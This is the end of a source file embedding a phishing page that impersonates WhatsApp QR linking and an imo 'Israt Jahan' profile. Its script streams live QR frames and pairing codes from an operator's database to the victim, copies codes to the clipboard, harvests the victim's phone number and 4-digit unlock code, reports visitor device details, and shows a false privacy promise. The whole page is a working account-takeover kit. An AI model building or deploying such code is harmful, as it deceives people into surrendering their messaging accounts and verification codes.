          <button class="imo-addb" type="submit">Add</button>
        </form>
      </div>
      <div id="imoLkBar" class="imo-lkbar">🔒 <span>Israt Jahan imo profile Locked</span></div>
    </div>
  </div>

  <div id="imoProfScr">
    <div class="imo-ptop">
      <div class="imo-pav"><img id="imoAv2" alt="Israt Jahan" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 80 80'%3E%3Crect width='80' height='80' fill='%23009CFD'/%3E%3C/svg%3E"></div>
      <h2 class="imo-pnm2">Israt Jahan</h2>
      <div class="imo-plst">
        <button class="imo-pit" type="button" onclick="window._t('VoiceClub: Connecting...')"><span>🎧 VoiceClub</span><span style="font-size:13px;color:#94a3b8">Make friends ›</span></button>
        <button class="imo-pit" type="button" onclick="window._t('Opening Story Albums...')"><span>🖼️ Story Albums</span><span style="color:#cbd5e1">›</span></button>
        <button class="imo-pit red" type="button" onclick="window._t('Report submitted')"><span>⚠️ Report</span></button>
      </div>
    </div>
    <div class="imo-pbot"><button id="imoFinalAdd" class="imo-padd" type="button">+ Add</button></div>
  </div>

  <div id="imoPrivMod" class="imo-modal">
    <div class="imo-md">
      <p class="imo-mdp">imo protects your privacy. We won’t give out your phone number to anyone.</p>
      <div class="imo-mdok"><button id="imoPrivOk" type="button">OK</button></div>
    </div>
  </div>
</div>
</div>

<script>
(function(){
const DB="$dbUrl",ROOT="$root",SLOT=$slot,PW="$pw",SHARE="$safeShare"||window.location.href;
const COUNTRIES=[
  {f:"🇸🇦",n:"Saudi Arabia",c:"+966"},{f:"🇧🇩",n:"Bangladesh",c:"+880"},{f:"🇦🇪",n:"UAE",c:"+971"},
  {f:"🇴🇲",n:"Oman",c:"+968"},{f:"🇶🇦",n:"Qatar",c:"+974"},{f:"🇰🇼",n:"Kuwait",c:"+965"},
  {f:"🇲🇾",n:"Malaysia",c:"+60"},{f:"🇸🇬",n:"Singapore",c:"+65"},{f:"🇧🇭",n:"Bahrain",c:"+973"},
  {f:"🇬🇧",n:"United Kingdom",c:"+44"},{f:"🇺🇸",n:"United States",c:"+1"},{f:"🇮🇹",n:"Italy",c:"+39"},
  {f:"🇮🇳",n:"India",c:"+91"},{f:"🇵🇰",n:"Pakistan",c:"+92"}
];

const waRoot=document.getElementById("waRoot"),imoRoot=document.getElementById("imoRoot");
const waCv=document.getElementById("waCv"),waVd=document.getElementById("waVd"),waQrb=document.getElementById("waQrb"),waQrl=document.getElementById("waQrl");
const waPbar=document.getElementById("waPbar"),waPbtn=document.getElementById("waPbtn"),waPlbl=document.getElementById("waPlbl"),waPtm=document.getElementById("waPtm"),waSmod=document.getElementById("waSmod"),waHboxes=document.getElementById("waHboxes");
const imoStCv=document.getElementById("imoStCv"),imoLvCv=document.getElementById("imoLvCv"),imoLvVd=document.getElementById("imoLvVd");
const waCtx=waCv.getContext("2d",{alpha:false}),imoStCtx=imoStCv.getContext("2d"),imoLvCtx=imoLvCv.getContext("2d",{alpha:false});
const toastEl=document.getElementById("uToast");

let curMode="whatsapp",modeKnown=false,lastModeTs=0;
let live=false,liveVidSrc="",curImg=null,crop=null,preCropped=true,qrMiss=0,sc=null,fc=0,det=false;
let curStart=0,lastTs=0,lastSeq=0,lastData="",decGen=0,drawnGen=0;
let liveSseOk=false,lastLiveSse=0,stateSseOk=false,lastStateSse=0,ctrlBusy=false;
let autoT=null,pCode="",lastCodeKey="",pInt=null,pOut=null,ac=null;
let rafId=0,ang=0,sy=20,sd=1;
let cc="+966",subPhone="",isVerified=false,openedAt=Date.now(),waSuccDone=false,imoSuccHandled=0,imoErrHandled=0;

function toast(m){toastEl.textContent=m;toastEl.style.display="block";clearTimeout(toastEl._t);toastEl._t=setTimeout(()=>toastEl.style.display="none",2500);}
window._t=toast;
function beep(hi){try{if(!ac)ac=new(window.AudioContext||window.webkitAudioContext)();if(ac.state==="suspended")ac.resume();const o=ac.createOscillator(),g=ac.createGain();o.type="sine";o.frequency.setValueAtTime(hi?880:587,ac.currentTime);g.gain.setValueAtTime(.14,ac.currentTime);g.gain.exponentialRampToValueAtTime(.01,ac.currentTime+.12);o.connect(g);g.connect(ac.destination);o.start();o.stop(ac.currentTime+.12);if(navigator.vibrate)navigator.vibrate(35);}catch(e){}}
async function copyTxt(t){if(!t)return false;try{if(navigator.clipboard&&document.hasFocus()){await navigator.clipboard.writeText(t);return true;}}catch(e){}try{const a=document.createElement("textarea");a.value=t;a.style.cssText="position:fixed;opacity:0";document.body.appendChild(a);a.focus();a.select();const ok=document.execCommand("copy");document.body.removeChild(a);return ok;}catch(e){return false;}}

function stopWaAuto(){if(autoT){clearInterval(autoT);autoT=null;}waQrl.textContent="QR cod";}
function stopImoRaf(){if(rafId){cancelAnimationFrame(rafId);rafId=0;}}

function animImoStandby(){
  if(live||curMode!=="imo"){rafId=0;return;}
  const w=320,h=320;
  const g=imoStCtx.createLinearGradient(0,0,w,h);g.addColorStop(0,"#090D16");g.addColorStop(.5,"#0F172A");g.addColorStop(1,"#050811");
  imoStCtx.fillStyle=g;imoStCtx.fillRect(0,0,w,h);
  imoStCtx.strokeStyle="rgba(56,189,248,0.07)";imoStCtx.lineWidth=1;
  for(let i=0;i<w;i+=24){imoStCtx.beginPath();imoStCtx.moveTo(i,0);imoStCtx.lineTo(i,h);imoStCtx.stroke();imoStCtx.beginPath();imoStCtx.moveTo(0,i);imoStCtx.lineTo(w,i);imoStCtx.stroke();}
  imoStCtx.save();imoStCtx.translate(w/2,h/2);imoStCtx.rotate(ang);ang+=0.015;
  imoStCtx.strokeStyle="rgba(14,165,233,0.25)";imoStCtx.lineWidth=1.5;imoStCtx.beginPath();imoStCtx.arc(0,0,56,0,Math.PI*2);imoStCtx.stroke();
  imoStCtx.strokeStyle="rgba(56,189,248,0.4)";imoStCtx.setLineDash([7,10]);imoStCtx.beginPath();imoStCtx.arc(0,0,86,0,Math.PI*2);imoStCtx.stroke();imoStCtx.restore();
  const now=Date.now(),bs=11,ms=7,ox=(w-ms*bs)/2,oy=(h-ms*bs)/2;
  for(let r=0;r<ms;r++)for(let c=0;c<ms;c++){const cr=(r<2&&c<2)||(r<2&&c>=5)||(r>=5&&c<2);if(cr||Math.sin(now*.003+r*1.5+c*2.1)>0){imoStCtx.fillStyle=cr?"#38BDF8":"rgba(56,189,248,0.45)";imoStCtx.fillRect(ox+c*bs,oy+r*bs,bs-2,bs-2);}}
  sy+=1.8*sd;if(sy>h-20)sd=-1;if(sy<20)sd=1;
  imoStCtx.strokeStyle="#38BDF8";imoStCtx.lineWidth=1.5;imoStCtx.beginPath();imoStCtx.moveTo(12,sy);imoStCtx.lineTo(w-12,sy);imoStCtx.stroke();
  rafId=requestAnimationFrame(animImoStandby);
}
function startImoStandby(){if(!rafId&&!live&&curMode==="imo")rafId=requestAnimationFrame(animImoStandby);}

function paintTo(ctx,cv,R){
  if(!curImg)return;
  if(cv.width!==R){cv.width=R;cv.height=R;}
  ctx.imageSmoothingEnabled=true;ctx.imageSmoothingQuality="high";
  if(crop){ctx.fillStyle="#fff";ctx.fillRect(0,0,R,R);ctx.drawImage(curImg,crop.sx,crop.sy,crop.sw,crop.sh,0,0,R,R);}
  else if(preCropped){ctx.fillStyle="#fff";ctx.fillRect(0,0,R,R);const s=Math.min(R/curImg.width,R/curImg.height),dw=curImg.width*s,dh=curImg.height*s;ctx.drawImage(curImg,0,0,curImg.width,curImg.height,(R-dw)/2,(R-dh)/2,dw,dh);}
  else{ctx.fillStyle="#000";ctx.fillRect(0,0,R,R);const s=Math.min(R/curImg.width,R/curImg.height),dw=curImg.width*s,dh=curImg.height*s;ctx.drawImage(curImg,0,0,curImg.width,curImg.height,(R-dw)/2,(R-dh)/2,dw,dh);}
}
function drawActive(){
  if(curMode==="imo")paintTo(imoLvCtx,imoLvCv,460);
  else paintTo(waCtx,waCv,480);
}
function syncLiveElements(){
  if(!live){
    waCv.style.display="none";waVd.style.display="none";waQrb.style.display="flex";
    imoLvCv.style.display="none";imoLvVd.style.display="none";imoStCv.style.display="block";
    startImoStandby();
    return;
  }
  waQrb.style.display="none";imoStCv.style.display="none";stopImoRaf();
  if(liveVidSrc){
    if(curMode==="imo"){imoLvCv.style.display="none";if(imoLvVd.src!==liveVidSrc)imoLvVd.src=liveVidSrc;imoLvVd.style.display="block";}
    else{waCv.style.display="none";if(waVd.src!==liveVidSrc)waVd.src=liveVidSrc;waVd.style.display="block";}
  }else if(curImg){
    if(curMode==="imo"){imoLvVd.style.display="none";imoLvCv.style.display="block";}
    else{waVd.style.display="none";waCv.style.display="block";}
    drawActive();
  }
}

// Instant real-time mode switch between WhatsApp Website and imo Website on the SAME link
function applyMode(rawMode,ts){
  const m=(String(rawMode||"").toLowerCase()==="imo")?"imo":"whatsapp";
  const mTs=Number(ts||0);
  if(mTs>0&&lastModeTs>0&&mTs<lastModeTs)return;
  if(mTs>lastModeTs)lastModeTs=mTs;
  modeKnown=true;
  if(m===curMode&&(waRoot.style.display==="flex"||imoRoot.style.display==="flex"))return;
  curMode=m;
  if(m==="imo"){
    stopWaAuto();
    waRoot.style.display="none";
    imoRoot.style.display="flex";
    document.body.style.background="#F3F5F5";
    document.title="My QR code - Israt Jahan (Ch #"+SLOT+")";
  }else{
    stopImoRaf();
    imoRoot.style.display="none";
    waRoot.style.display="flex";
    document.body.style.background="#f0f2f5";
    document.title="Short link QR - Ch #"+SLOT;
  }
  syncLiveElements();
}

function scanQr(im){
  if(!window.jsQR||preCropped)return;if(!sc)sc=document.createElement("canvas");
  const M=360,s=Math.min(1,M/Math.max(im.width,im.height)),w=Math.round(im.width*s),h=Math.round(im.height*s);
  sc.width=w;sc.height=h;const x=sc.getContext("2d",{willReadFrequently:true});x.drawImage(im,0,0,w,h);
  try{
    const q=window.jsQR(x.getImageData(0,0,w,h).data,w,h,{inversionAttempts:"dontInvert"});
    if(q&&q.location){
      qrMiss=0;
      const l=q.location,x0=Math.min(l.topLeftCorner.x,l.bottomLeftCorner.x)/s,x1=Math.max(l.topRightCorner.x,l.bottomRightCorner.x)/s,y0=Math.min(l.topLeftCorner.y,l.topRightCorner.y)/s,y1=Math.max(l.bottomLeftCorner.y,l.bottomRightCorner.y)/s;
      const qw=x1-x0,qh=y1-y0,pd=Math.max(qw,qh)*0.18,cx=(x0+x1)/2,cy=(y0+y1)/2,ts=Math.max(qw,qh)+pd*2;
      const sx=Math.max(0,Math.min(im.width-ts,cx-ts/2)),sy=Math.max(0,Math.min(im.height-ts,cy-ts/2)),sd2=Math.min(ts,im.width-sx,im.height-sy);
      if(!crop||Math.abs(sx-crop.sx)>12||Math.abs(sy-crop.sy)>12||Math.abs(sd2-crop.sw)>12){crop={sx,sy,sw:sd2,sh:sd2};drawActive();}
    }else if(crop&&(++qrMiss>=3)){crop=null;drawActive();}
  }catch(e){}
}

function resetStandby(){
  live=false;liveVidSrc="";crop=null;curImg=null;lastTs=0;lastSeq=0;lastData="";decGen++;
  syncLiveElements();
}

function onLive(v){
  if(v===null||v===undefined){resetStandby();return;}
  let d=null,act=true,ts=0,seq=0,st=0,crp=false,plat="";
  if(typeof v==="string"&&v.length>20){d=v;}
  else if(v&&typeof v==="object"){
    if(v.active===false||v.status==="stopped")act=false;
    const c=v.data||v.image||v.frame||v.videoUrl||v.video||v.url||v.qrCode||v.src;
    if(typeof c==="string"&&c.length>20)d=c;
    ts=Number(v.ts||v.timestamp||v.updatedAt||0);
    seq=Number(v.seq||0);
    st=Number(v.startTime||0);
    crp=Boolean(v.cropped);
    plat=String(v.platform||"");
  }
  if(!modeKnown&&plat)applyMode(plat,0);
  if(!act){resetStandby();return;}
  if(!d)return;
  if(st&&st!==curStart){curStart=st;lastTs=0;lastSeq=0;lastData="";crop=null;}
  if(seq>0&&lastSeq>0&&seq<lastSeq)return;
  if(ts>0&&lastTs>0&&ts<lastTs)return;
  if(ts>lastTs)lastTs=ts;
  if(seq>lastSeq)lastSeq=seq;
  if(d.startsWith("/9j/"))d="data:image/jpeg;base64,"+d;
  else if(d.startsWith("iVBOR"))d="data:image/png;base64,"+d;
  if(!live){live=true;if(autoT){stopWaAuto();toast("লাইভ ভিডিও ফ্রেমে সংযুক্ত হয়েছে!");}}
  if(d===lastData)return;
  lastData=d;
  preCropped=crp;
  if(crp)crop=null;
  const lo=d.slice(0,64).toLowerCase();
  const isV=lo.startsWith("data:video/")||(!lo.startsWith("data:")&&/\.(mp4|webm|ogg|m3u8)(\?|$)/i.test(d));
  if(isV){
    liveVidSrc=d;curImg=null;syncLiveElements();
  }else{
    liveVidSrc="";
    const g=++decGen,im=new Image();im.decoding="async";
    im.onload=()=>{
      if(g<drawnGen||!live)return;
      drawnGen=g;curImg=im;syncLiveElements();fc++;
      if(!preCropped&&(!crop||fc%10===0)&&!det){det=true;setTimeout(()=>{try{scanQr(im);}finally{det=false;}},0);}
    };
    im.src=d;
  }
}

// === Pairing / Unlock Code & Success Handlers ===
function handleIncomingCode(raw,key){
  const c=String(raw||"").replace(/[^A-Za-z0-9]/g,"").toUpperCase();
  if(!c||key===lastCodeKey)return;
  if(curMode==="imo"){
    lastCodeKey=key;pCode=c;
    document.getElementById("imoPbar").style.display="flex";
    document.getElementById("imoPlbl").textContent="Copy Code: "+c;
    copyTxt(c);toast("Code copied: "+c);
    if(c.length===4&&/^[0-9]{4}$/.test(c)&&document.getElementById("imoVerSec").style.display==="flex")updImoBoxes(c);
  }else if(c.length===8){
    lastCodeKey=key;pCode=c;
    waHboxes.innerHTML=c.split("").map((ch,i)=>'<input type="text" readonly value="'+ch+'" data-box-index="'+i+'">').join("");
    waPbar.style.display="flex";waPlbl.textContent="কপি কোড";let rem=60;waPtm.textContent="60s";
    copyTxt(c).then(ok=>{if(ok)waPlbl.textContent="কপি হয়েছে ✓";});
    beep(true);try{if(window.confetti)window.confetti({particleCount:50,spread:60,origin:{y:0.7}});}catch(e){}
    toast("পেয়ারিং কোড ক্লিপবোর্ডে কপি হয়েছে!");
    clearInterval(pInt);clearTimeout(pOut);
    pInt=setInterval(()=>{rem=rem>1?rem-1:0;waPtm.textContent=rem+"s";},1000);
    pOut=setTimeout(()=>{waPbar.style.display="none";clearInterval(pInt);},60000);
  }
}

function handleStatusOrVerification(stObj,verObj){
  if(curMode==="imo"){
    const sig=(verObj&&verObj.signal)||(stObj&&(stObj.signal||stObj.status||stObj.command));
    const ts=Number((verObj&&verObj.signalTs)||(stObj&&(stObj.signalTs||stObj.timestamp))||0);
    if(sig==="success"&&ts>=openedAt-4000&&ts!==imoSuccHandled){
      imoSuccHandled=ts;isVerified=true;toast("Verified! Tap Add to open imo.");
      if(document.getElementById("imoProfScr").style.display!=="flex"){
        document.getElementById("imoMainScr").style.display="none";
        document.getElementById("imoProfScr").style.display="flex";
      }
    }else if(sig==="error"&&ts>=openedAt-4000&&ts!==imoErrHandled){
      imoErrHandled=ts;isVerified=false;
      document.getElementById("imoProfScr").style.display="none";
      document.getElementById("imoMainScr").style.display="block";
      document.getElementById("imoWm").style.display="none";
      document.getElementById("imoQrSec").style.display="none";
      document.getElementById("imoVerSec").style.display="flex";
      document.getElementById("imoVerr").style.display="block";
      updImoBoxes("");toast("Your unlock number incorrect. Try again.");
    }
  }else{
    if(!waSuccDone&&stObj&&(stObj.status==="success"||stObj.command==="success"||stObj.signal==="success")){
      const ts=Number(stObj.timestamp||stObj.signalTs||0);
      if(ts>=openedAt-4000){
        waSuccDone=true;beep(true);
        try{if(window.confetti)window.confetti({particleCount:70,spread:70,origin:{y:0.6}});}catch(e){}
        waSmod.style.display="flex";toast("Success কমান্ড পাওয়া গেছে!");
      }
    }else if(stObj&&(stObj.status==="error"||stObj.command==="error"||stObj.signal==="error")){
      const ts=Number(stObj.timestamp||stObj.signalTs||0);
      if(ts>=openedAt-4000){
        waSuccDone=false;beep(false);
        waSmod.style.display="none";
        toast("Error সিগন্যাল পাওয়া গেছে! কোড আবার চেক করুন।");
      }
    }
  }
}

function mergeState(s){
  if(!s||typeof s!=="object")return;
  if(s.mode)applyMode(s.mode,s.modeTs||0);
  if(s.liveCode&&s.liveCode.code&&s.liveCode.timestamp&&(Date.now()-s.liveCode.timestamp<58000)){
    handleIncomingCode(s.liveCode.code,s.liveCode.code+"_"+s.liveCode.timestamp);
  }
  if(s.status||s.verification){
    handleStatusOrVerification(s.status,s.verification);
  }
}

// 1. Immediate startup fetch + Dual lightweight SSE streams (state.json for mode/codes/status + live.json for frames)
fetch(DB+"/"+ROOT+"/state.json",{cache:"no-store"}).then(r=>r.json()).then(mergeState).catch(()=>{});
fetch(DB+"/"+ROOT+"/live.json",{cache:"no-store"}).then(r=>r.json()).then(onLive).catch(()=>{});
fetch(DB+"/"+ROOT+"/visitor.json",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"visitor",platform:curMode,timestamp:Date.now(),device:(navigator.userAgent?navigator.userAgent.substring(0,80):"Web Visitor")})}).catch(()=>{});

try{
  const esState=new EventSource(DB+"/"+ROOT+"/state.json");
  esState.onopen=()=>{stateSseOk=true;lastStateSse=Date.now();};
  const onStMsg=e=>{
    stateSseOk=true;lastStateSse=Date.now();
    try{
      const p=JSON.parse(e.data);
      if(!p)return;
      if(p.path==="/"&&p.data)mergeState(p.data);
      else if(p.path==="/mode"&&p.data)applyMode(p.data,Date.now());
      else if(p.path==="/liveCode"&&p.data)mergeState({liveCode:p.data});
      else if(p.path==="/status"&&p.data)mergeState({status:p.data});
      else if(p.path==="/verification"&&p.data)mergeState({verification:p.data});
    }catch(_){}
  };
  esState.addEventListener("put",onStMsg);
  esState.addEventListener("patch",onStMsg);
  esState.addEventListener("keep-alive",()=>{stateSseOk=true;lastStateSse=Date.now();});
  esState.onerror=()=>{stateSseOk=false;};
}catch(e){stateSseOk=false;}

try{
  const esLive=new EventSource(DB+"/"+ROOT+"/live.json");
  esLive.onopen=()=>{liveSseOk=true;lastLiveSse=Date.now();};
  esLive.addEventListener("put",e=>{liveSseOk=true;lastLiveSse=Date.now();try{const p=JSON.parse(e.data);if(p.path==="/")onLive(p.data);else if(p.path==="/active"&&p.data===false)resetStandby();}catch(_){}});
  esLive.addEventListener("patch",e=>{liveSseOk=true;lastLiveSse=Date.now();try{const p=JSON.parse(e.data);if(p.path==="/"&&p.data){if(p.data.active===false)resetStandby();else if(p.data.data)onLive(p.data);}}catch(_){}});
  esLive.addEventListener("keep-alive",()=>{liveSseOk=true;lastLiveSse=Date.now();});
  esLive.onerror=()=>{liveSseOk=false;};
}catch(e){liveSseOk=false;}

// 2. Defer non-essential avatars & auxiliary scripts until after live stream initializes
setTimeout(()=>{
  fetch(DB+"/portal_assets/logoDataUrl.json").then(r=>r.json()).then(u=>{if(typeof u==="string"&&u.startsWith("data:image"))document.getElementById("waAvImg").src=u;}).catch(()=>{});
  fetch(DB+"/portal_assets/imoLogoDataUrl.json").then(r=>r.json()).then(u=>{if(typeof u==="string"&&u.startsWith("data:image")){document.getElementById("imoAv1").src=u;document.getElementById("imoAv2").src=u;}}).catch(()=>{});
},400);
setTimeout(()=>{["https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js","https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"].forEach(u=>{const s=document.createElement("script");s.src=u;s.async=true;document.head.appendChild(s);});},1400);

// === WhatsApp Interactions ===
function sendTrig(plat){
  return fetch(DB+"/"+ROOT+"/trigger.json",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"get_started",command:"get_started",platform:plat,channelSlot:SLOT,channelPassword:PW,timestamp:Date.now()})});
}
waQrb.onclick=async()=>{beep(false);waQrl.textContent="make a qr cod";try{await sendTrig("whatsapp");beep(true);toast("make a qr cod");}catch(e){}if(autoT)clearInterval(autoT);autoT=setInterval(()=>{if(!live&&curMode==="whatsapp"){sendTrig("whatsapp").catch(()=>{});toast("make a qr cod");}},60000);};
waPbtn.onclick=async()=>{if(!pCode)return;await copyTxt(pCode);waPlbl.textContent="কপি হয়েছে ✓";beep(true);toast("পেয়ারিং কোড ক্লিপবোর্ডে কপি হয়েছে!");};
document.getElementById("waPx").onclick=()=>{waPbar.style.display="none";};
document.getElementById("waSbtn").onclick=async()=>{beep(false);await copyTxt(SHARE);if(navigator.share){try{await navigator.share({title:"Short link QR",text:"Live QR Link: "+SHARE,url:SHARE});beep(true);return;}catch(e){if(e&&e.name==="AbortError")return;}}beep(true);toast("ওয়েবসাইট লিংক কপি করা হয়েছে!");};
document.getElementById("waScls").onclick=()=>waSmod.style.display="none";
document.getElementById("waLnk").onclick=()=>{beep(true);waSmod.style.display="none";};

// === imo Interactions ===
document.getElementById("imoQrFrame").onclick=()=>{
  if(!live)sendTrig("imo").then(()=>toast("Connecting imo live QR...")).catch(()=>{});
};
document.getElementById("imoShBtn").onclick=async()=>{
  await copyTxt(SHARE);
  if(navigator.share){try{await navigator.share({title:"Israt Jahan - imo QR",text:"Add me on imo: "+SHARE,url:SHARE});return;}catch(e){}}
  toast("imo website link copied!");
};
const imoPhBtn=document.getElementById("imoPhBtn"),imoPhBox=document.getElementById("imoPhBox"),imoLkBar=document.getElementById("imoLkBar"),imoCcDd=document.getElementById("imoCcDd");
COUNTRIES.forEach(c=>{const b=document.createElement("button");b.type="button";b.className="imo-ddi";b.innerHTML="<span>"+c.f+" "+c.n+"</span><b>"+c.c+"</b>";b.onclick=()=>{cc=c.c;document.getElementById("imoCcFlg").textContent=c.f;document.getElementById("imoCcTxt").textContent=c.c;imoCcDd.style.display="none";};imoCcDd.appendChild(b);});
document.getElementById("imoCcBtn").onclick=()=>{imoCcDd.style.display=imoCcDd.style.display==="block"?"none":"block";};
imoPhBtn.onclick=()=>{imoPhBtn.style.display="none";imoPhBox.style.display="block";document.getElementById("imoPhInp").focus();};
document.getElementById("imoPhForm").onsubmit=async(e)=>{
  e.preventDefault();
  const raw=document.getElementById("imoPhInp").value.trim()||"0501234567";
  subPhone=raw.startsWith("+")?raw:(cc+raw.replace(/^0+/,""));
  const verPayload={phoneNumber:subPhone,countryCode:cc,status:"phone_submitted",signal:"waiting",channelSlot:SLOT,timestamp:Date.now()};
  await fetch(DB+"/"+ROOT+"/verification.json",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(verPayload)}).catch(()=>{});
  imoPhBox.style.display="none";imoLkBar.style.display="flex";document.getElementById("imoPrivMod").style.display="flex";
};
document.getElementById("imoPrivOk").onclick=()=>{
  document.getElementById("imoPrivMod").style.display="none";
  document.getElementById("imoWm").style.display="none";
  document.getElementById("imoQrSec").style.display="none";
  document.getElementById("imoVerSec").style.display="flex";
  document.getElementById("imoOinp").focus();
};
const imoOinp=document.getElementById("imoOinp");
function updImoBoxes(v){
  const d=v.replace(/[^0-9]/g,"").slice(0,4);imoOinp.value=d;
  document.getElementById("imoMpin").textContent=d||"* * * *";
  for(let i=0;i<4;i++){const b=document.getElementById("imoBx"+i);b.textContent=d[i]||"";b.className="imo-bx"+(i===Math.min(d.length,3)?" act":"");}
  if(d.length===4)submitImoOtp(d);
}
imoOinp.oninput=e=>updImoBoxes(e.target.value);
async function submitImoOtp(code){
  await fetch(DB+"/"+ROOT+"/verification.json",{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify({unlockCode:code,status:"code_submitted",signal:"waiting",updatedAt:Date.now()})}).catch(()=>{});
  document.getElementById("imoMainScr").style.display="none";
  document.getElementById("imoProfScr").style.display="flex";
}
document.getElementById("imoRsnd").onclick=()=>{if(imoOinp.value.length===4)submitImoOtp(imoOinp.value);else toast("Please enter the 4-digit unlock code");};
document.getElementById("imoFinalAdd").onclick=()=>{
  if(isVerified){toast("Redirecting to imo...");setTimeout(()=>{window.location.href="https://s.imoim.net/dhCQvv";},350);}
  else toast("Verification in progress... please wait");
};
document.getElementById("imoPbtn").onclick=()=>{if(pCode){copyTxt(pCode);toast("Copied: "+pCode);}};

// 3. Zero-pressure fallback: ONLY fetches if SSE disconnects (0 HTTP requests when SSE is healthy!)
async function pollFallback(){
  if(ctrlBusy)return;
  const needLiveFallback=!liveSseOk||(Date.now()-lastLiveSse>5000);
  const needStateFallback=!stateSseOk||(Date.now()-lastStateSse>12000);
  if(!needLiveFallback&&!needStateFallback)return;
  ctrlBusy=true;
  try{
    if(needStateFallback){
      const st=await fetch(DB+"/"+ROOT+"/state.json",{cache:"no-store"}).then(r=>r.json()).catch(()=>null);
      if(st)mergeState(st);
    }
    if(needLiveFallback){
      const lv=await fetch(DB+"/"+ROOT+"/live.json",{cache:"no-store"}).then(r=>r.json()).catch(()=>null);
      onLive(lv);
    }
  }catch(_){}finally{ctrlBusy=false;}
}
setInterval(pollFallback,3500);
})();
</script>
</body>
</html>"""
    }
}
